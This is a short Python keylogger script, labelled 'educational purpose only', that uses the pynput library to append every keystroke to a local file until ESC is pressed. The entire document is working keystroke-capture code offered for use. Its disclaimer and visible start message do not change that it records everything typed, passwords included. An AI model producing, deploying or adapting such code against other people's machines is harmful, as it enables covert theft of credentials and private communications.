# Keylogger (Educational Purpose Only!)
from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("[" + str(key) + "]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop. (Educational use on your own machine ONLY.)")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
